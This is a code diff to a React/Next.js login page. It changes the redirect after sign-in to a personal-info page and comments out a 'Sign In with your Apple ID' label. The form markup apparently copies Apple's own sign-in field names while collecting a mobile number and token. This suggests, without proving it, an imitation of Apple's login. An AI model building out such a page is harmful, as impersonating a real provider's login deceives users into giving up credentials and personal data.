@@ -5,6 +5,7 @@ import Layout from '../components/layout'
 import RequestHelper from '../utils/requestHelper'
 import { useSelector, useDispatch } from 'react-redux'
 import { login, logout } from '../store/slices/authSlice'
+import { useAppSelector } from '../store/hooks'
 
 const Home: NextPage = () => {
 
@@ -12,6 +13,7 @@ const Home: NextPage = () => {
   const router = useRouter()
 
   const dispatch = useDispatch()
+  const { previous } = useAppSelector(state => state.order)
 
   const submit = async (event: React.SyntheticEvent) => {
     event.preventDefault();
@@ -24,7 +26,11 @@ const Home: NextPage = () => {
         mobile: router.query.mobile,
         token,
       }))
-      router.push('/')
+      // if (previous === 'problem') {
+      // router.push('/')
+
+      // }
+      router.push('/personalInfo')
     } catch (err) { }
   };
 
@@ -56,7 +62,7 @@ const Home: NextPage = () => {
                       <div className="si-field-container container">
                         <div className="form-table">
                           <div className="account-name form-row    ">
-                            <label className="sr-only form-cell form-label" htmlFor="account_name_text_field">Sign In with your Apple&nbsp;ID</label>
+                            {/* <label className="sr-only form-cell form-label" htmlFor="account_name_text_field">Sign In with your Apple&nbsp;ID</label> */}
                             <div className="form-cell">
                               <div className=" form-cell-wrapper ">
                                 <input type="number"
